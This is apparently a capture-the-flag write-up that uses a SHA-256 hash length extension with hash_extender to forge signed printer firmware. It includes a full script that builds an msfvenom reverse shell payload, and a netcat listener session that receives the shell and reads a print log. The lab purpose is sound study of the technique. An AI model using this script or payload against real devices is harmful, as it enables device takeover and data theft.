The idea is quite simple: Use the hash_extender to add one zip to another zip while preserving the produced hash. Two things are important or the whole operation won't work as expected:

* The modified firmware needs to "shadow" the original firmware. This is only the case if the filename is exactly the same. 
* The hash_extender is quite tricky to handle. It does accept a file as original but only a string to be appended. As a zip contains binary it's safer to convert it to base64 before adding it.

To make life a little easier I write a small script so I didn't need to enter the commands manually. I haven chosen to inlude a standard reverse shell as payload.

Helper program: 

```bash
┌──(ben㉿42c96d2)-[~/Work/printer]
└─$ cat complete.sh 
#!/bin/bash
rm firmware.bin firmware2.bin firmware-export2.zip firmware-export.zip firmware-import.json 
cat firmware-export.json | cut -f 4 -d "\"" | base64 --decode > firmware-export.zip
msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f elf > firmware.bin
chmod 0755 firmware.bin
zip -rv firmware-export2.zip firmware.bin
oldsig=`cat firmware-export.json | cut -f 8 -d "\"" `
newfile="504b0304140000000800cf0c9253ea51bdc778000000c20000000c001c006669726d776172652e62696e5554090003852dbd617d2dbd6175780b000104e803000004e8030000ab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a1d4d16993e04e5f1c0340840a82ccd8899594cf1598c71fcac1ed33d76323130045c79bcee5ea047e7b32c81a82cad087ed62ce6388fffe7b21481ccd26f59d611333d76eb2765e6e9176730047b743e0f0a07aae5670500504b01021e03140000000800cf0c9253ea51bdc778000000c20000000c0018000000000000000000ed81000000006669726d776172652e62696e5554050003852dbd6175780b000104e803000004e8030000504b0506000000000100010052000000be0000000000" # Converted via CyberChef to Base64, the command below was not working as it shouls 
echo -n "{\"firmware\":\"" > firmware-import.json 
# cat firmware-export.zip | base64 -w 0 >> firmware-import.json
#./hash_extender --file=firmware-export.zip --signature="$oldsig" --format=sha256 --secret=16 --out-data-format=raw --out-signature-format=none -q --append=" " | base64 -w 0 >> firmware-import.json
./hash_extender --file=firmware-export.zip --signature="$oldsig" --format=sha256 --secret=16 --out-data-format=raw --out-signature-format=none -q --append="$newfile" --append-format=hex | base64 -w 0 >> firmware-import.json
echo -n "\",\"signature\":\"" >> firmware-import.json
# echo -n "$oldsig" >> firmware-import.json
#./hash_extender --file=firmware-export.zip --signature="$oldsig" --format=sha256 --secret=16 --out-data-format=none --out-signature-format=hex -q --append=" " >> firmware-import.json
./hash_extender --file=firmware-export.zip --signature="$oldsig" --format=sha256 --secret=16 --out-data-format=none --out-signature-format=hex -q --append="$newfile" --append-format=hex >> firmware-import.json
echo -n "\",\"secret_length\":16,\"algorithm\":\"SHA256\"}" >> firmware-import.json
```

On another machine:

```bash
$ bash
ben@localhost:~$ sudo nc -nvlp 80
[sudo] password for ben: 
Listening on 0.0.0.0 80
Connection received on 34.121.219.20 47358
pwd
/app
cat /var/spool/printer.log
Documents queued for printing
=============================

Biggering.pdf
Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf
LowEarthOrbitFreqUsage.txt
Best Winter Songs Ever List.doc
Win People and Influence Friends.pdf
Q4 Game Floor Earnings.xlsx
Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
Troll_Pay_Chart.xlsx

```
